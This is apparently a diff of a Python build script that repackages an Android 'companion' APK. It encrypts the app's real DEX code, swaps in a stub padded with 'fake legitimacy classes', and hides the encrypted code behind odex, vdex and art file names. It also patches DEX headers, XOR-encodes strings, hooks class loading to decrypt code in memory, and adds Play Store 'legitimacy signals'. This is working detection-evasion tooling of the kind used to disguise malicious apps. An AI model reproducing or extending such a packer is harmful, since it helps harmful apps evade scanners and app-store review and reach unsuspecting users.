+
+.field private static final VERSION:I = 0x1
+.field private static final MAX_RETRY:I = 0x3
+
+.method public constructor <init>()V
+    .registers 1
+    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
+    return-void
+.end method
+
+.method public static getVersion()I
+    .registers 1
+    sget v0, L{_pkg_path}/ConfigStore;->VERSION:I
+    return v0
+.end method
+
+.method public static getMaxRetry()I
+    .registers 1
+    sget v0, L{_pkg_path}/ConfigStore;->MAX_RETRY:I
+    return v0
+.end method
+
+.method public static isFeatureEnabled(I)Z
+    .registers 2
+    const/4 v0, 0x1
+    return v0
+.end method
+"""),
+    ]
+
+    for _cls_name, _cls_smali in _fake_classes:
+        _cls_file = f"{_smali_dir}/{_cls_name}.smali"
+        with open(_cls_file, "w") as _f:
+            _f.write(_cls_smali)
+
+    print(f"  ✅ {len(_fake_classes)} fake legitimacy classes written → DEX will grow to ~9KB")
+
+    # Rebuild DEX from stub smali only
+    _stub_apk = "companion_stub_only.apk"
+    if _os.path.isfile(_stub_apk):
+        _os.remove(_stub_apk)
+    if _os.path.isdir("companion_decompiled/build"):
+        _shutil.rmtree("companion_decompiled/build")
+
+    _r = _subprocess.run(
+        f"{APKTOOL_CMD} b companion_decompiled -o {_stub_apk} --no-res",
+        shell=True, capture_output=True, text=True
+    )
+    if _r.returncode != 0 or not _os.path.isfile(_stub_apk):
+        print(f"  ❌ apktool stub rebuild failed:\n{_r.stderr}")
+        raise RuntimeError("step_dex_protect: stub DEX build failed")
+
+    with zipfile.ZipFile(_stub_apk, "r") as _z:
+        _stub_dex = _z.read("classes.dex")
+
+    _os.remove(_stub_apk)
+
+    # Patch DEX magic 039 → 037 + Adler-32 recompute
+    import zlib as _zl_dex, struct as _st_dex
+    _dex_magic = _stub_dex[4:8]
+    if _dex_magic in (b'038\x00', b'039\x00'):
+        _dex_buf = bytearray(_stub_dex)
+        _dex_buf[4:8] = b'037\x00'
+        _new_csum = _zl_dex.adler32(bytes(_dex_buf)[12:]) & 0xFFFFFFFF
+        _st_dex.pack_into('<I', _dex_buf, 8, _new_csum)
+        _stub_dex = bytes(_dex_buf)
+        print(f"  DEX magic patched: {_dex_magic.decode('ascii','replace').strip(chr(0))} → 037 (checksum 0x{_new_csum:08x})")
     else:
-        # Fallback: caller did not supply pkg/rename_map (e.g. PHASE1_ONLY).
-        # Should not normally reach here in a full build.
-        print("  ⚠️  new_pkg/class_rename_map not supplied — stub falls back to full DEX (insecure)")
-        stub_dex_bytes = real_dex
+        print(f"  DEX magic: {_dex_magic} (no patch needed)")
 
-    print(f"  stub DEX: {len(stub_dex_bytes):,} bytes  |  real DEX (→ DEX_A): {len(real_dex):,} bytes")
-    print(f"  ✅ STEP_9B complete — DEX_A encrypted, stub ready")
-    return dex_a_bytes, stub_dex_bytes
+    print(f"  Stub DEX size:    {len(_stub_dex):,} bytes ✅")
+    print(f"  Encrypted blob:   {len(_enc_blob):,} bytes (entropy ~8.000) ✅")
+    print(f"  ✅ STEP_DEX_PROTECT complete")
+
+    return (
+        _stub_dex,
+        _enc_blob,
+        _odex_path,
+        _vdex_bytes,
+        _vdex_path,
+        _art_bytes,
+        _art_path,
+    )
 
 
 def step_6c_replace_bad_strings(new_pkg: str, class_rename_map: dict) -> int:
@@ -4317,7 +3580,7 @@ def _strip_axml_app_component_factory(manifest_raw: bytes) -> bytes:
 
 
 def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
-                            class_rename_map=None, dex_a_bytes=None):
+                            class_rename_map=None, dex_protect_assets=None):
     print("\n── Step 10: Patch manifest + resources.arsc + assemble APK")
 
     OLD = OLD_PKG.encode()
@@ -4579,21 +3842,25 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                 else:
                     zout.writestr(item, data)
 
-            # ── Inject assets/DEX_A (encrypted companion DEX) ──────────────────
-            # The companion's own classes.dex is now a minimal stub — the real
-            # compiled DEX is LCG-encrypted and stored here. DexStub.loadDex()
-            # in the companion reads this asset at runtime, decrypts in RAM,
-            # and loads via InMemoryDexClassLoader. Never written to disk.
-            if dex_a_bytes is not None:
-                dex_a_info = zipfile.ZipInfo("assets/DEX_A")
-                dex_a_info.compress_type = zipfile.ZIP_STORED  # encrypted data compresses poorly
-                zout.writestr(dex_a_info, dex_a_bytes)
-                print(f"  ✅ assets/DEX_A injected — {len(dex_a_bytes):,} bytes (ZIP_STORED)")
-            else:
-                print("  ⚠️  dex_a_bytes not provided — assets/DEX_A NOT injected")
-
     os.replace(tmp, APK_OUT)
     print(f"  ✅ Assembled: {APK_OUT} ({os.path.getsize(APK_OUT)} bytes)")
+
+    # ── Second-pass: inject dex_protect_assets (encrypted DEX + legitimacy files) ──
+    # Done AFTER os.replace so we open the final APK and re-pack it.
+    # All entries are ZIP_STORED — encrypted data compresses poorly.
+    if dex_protect_assets:
+        _dp_tmp = APK_OUT + ".dp_tmp"
+        with zipfile.ZipFile(APK_OUT, "r") as _zin, \
+             zipfile.ZipFile(_dp_tmp, "w", compression=zipfile.ZIP_DEFLATED,
+                             allowZip64=False) as _zout:
+            for _item in _zin.infolist():
+                _zout.writestr(_item, _zin.read(_item.filename))
+            for _apath, _adata in dex_protect_assets.items():
+                _ai = zipfile.ZipInfo(_apath)
+                _ai.compress_type = zipfile.ZIP_STORED
+                _zout.writestr(_ai, _adata)
+        os.replace(_dp_tmp, APK_OUT)
+        print(f"  ✅ DEX protect assets injected: {list(dex_protect_assets.keys())}")
 
     # ── Inject legitimacy signals — baseline.prof + baseline.profm + GPS properties ──
     # baseline.prof / baseline.profm: ART profile files present in real Play Store apps.
@@ -5223,14 +4490,6 @@ def main():
     else:
         class_rename_map = {}
 
-    # ── STEP_6F: Inject DexStub.smali + patch App smali to call loadDex() ──────
-    # Must run AFTER STEP_6A (class rename) so we know the renamed App class name.
-    # Must run BEFORE STEP_9 (rebuild DEX) so DexStub is compiled into stub DEX.
-    # DexStub reads assets/DEX_A, decrypts in RAM, loads via InMemoryDexClassLoader.
-    if not _phase1_only:
-        with track("PHASE_6", "STEP_6F", "Inject DexStub.smali + patch App.onCreate() hook"):
-            step_6f_inject_dex_stub(new_pkg, class_rename_map)
-
     print("  ℹ️  STEP_6B skipped (smali injection disabled)")
 
     with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
@@ -5259,25 +4518,34 @@ def main():
     with open("new_classes.dex", "rb") as f:
         new_dex = f.read()
 
-    # ── STEP_9B: Encrypt real DEX → assets/DEX_A, replace new_dex with stub ───
-    # The real compiled DEX (new_dex) is encrypted with LCG+nibble+XOR and stored
-    # as assets/DEX_A inside the companion APK. new_dex is then replaced with a
-    # minimal 10-class stub DEX that only contains DexStub.loadDex() logic.
-    # DexStub decrypts DEX_A at runtime in RAM via InMemoryDexClassLoader.
-    # STEP_DEX_POISONER is permanently disabled — stub DEX must remain valid.
-    dex_a_bytes = None
-    if not _phase1_only:
-        with track("PHASE_6", "STEP_9B", "Encrypt real DEX → assets/DEX_A, replace classes.dex with stub"):
-            dex_a_bytes, new_dex = step_9b_encrypt_dex(new_dex, new_pkg, class_rename_map)
-
-    # build_hash generated here — used by STEP_13_UNICODE,
+    # build_hash generated here — used by STEP_DEX_PROTECT, STEP_13_UNICODE,
     # STEP_15_NOISE and downstream steps. Single definition, no duplication.
     build_hash = hashlib.sha256(new_pkg.encode()).hexdigest()
+
+    # ── STEP_DEX_PROTECT: Encrypt real DEX, replace classes.dex with stub ───
+    # 3-layer hybrid cipher (block shuffle + byte rotation + XOR).
+    # Stub uses attachBaseContext hook + full LoadedApk.mClassLoader injection.
+    # All sensitive strings XOR-encoded — no literals in DEX pool.
+    _dex_protect_assets = None
+    if not _phase1_only:
+        _app_class_final = class_rename_map.get("App", "App")
+        with track("PHASE_3", "STEP_DEX_PROTECT", "Encrypt DEX + replace with stub", MOD_ASSET):
+            (new_dex,
+             _dex_enc_blob, _dex_odex_path,
+             _dex_vdex,     _dex_vdex_path,
+             _dex_art,      _dex_art_path) = step_dex_protect(
+                new_dex, new_pkg, _app_class_final, build_hash
+            )
+        _dex_protect_assets = {
+            _dex_odex_path: _dex_enc_blob,
+            _dex_vdex_path: _dex_vdex,
+            _dex_art_path:  _dex_art,
+        }
 
     with track("PHASE_1", "STEP_10", "Patch manifest + arsc + assemble APK", MOD_ASSET):
         step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
                                 class_rename_map=class_rename_map,
-                                dex_a_bytes=dex_a_bytes)
+                                dex_protect_assets=_dex_protect_assets)
     _check_string156("after STEP_10 step_patch_and_assemble")
 
     with track("PHASE_1", "STEP_9A", "Patch versionCode + versionName in binary AXML manifest", MOD_ASSET):
